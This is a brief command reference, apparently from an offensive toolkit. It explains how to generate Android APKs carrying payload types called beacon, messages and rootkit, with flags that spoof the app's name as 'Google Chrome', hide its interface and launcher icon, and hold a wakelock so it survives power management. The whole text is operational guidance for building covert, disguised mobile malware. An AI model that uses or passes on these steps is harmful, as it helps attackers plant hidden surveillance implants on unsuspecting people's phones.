## 🛠️ COMMAND SYNTAX & FLAGS
### generate-apk [type] [output_name]
Generates a customized Android APK using the **Native C Architecture** (Fastest).
- Types: drs, beacon, messages, rootkit. (See 'help payload-types').

### generate-apk-buildozer [type] [output_name]
Generates a customized Android APK using the **Kivy/Buildozer pipeline** (Standard).
- Types: drs, beacon, messages, rootkit. (See 'help payload-types').
- Flags (via set):
  - set APP_NAME "Google Chrome": Spoofs the installed application's title.
  - set SHOW_UI false: Disables the graphical interface for the payload.
  - set HIDE_ICON true: Attempts to hide the launcher icon post-install.
  - set WAKELOCK true: Requests a CPU wakelock to prevent Doze mode termination.

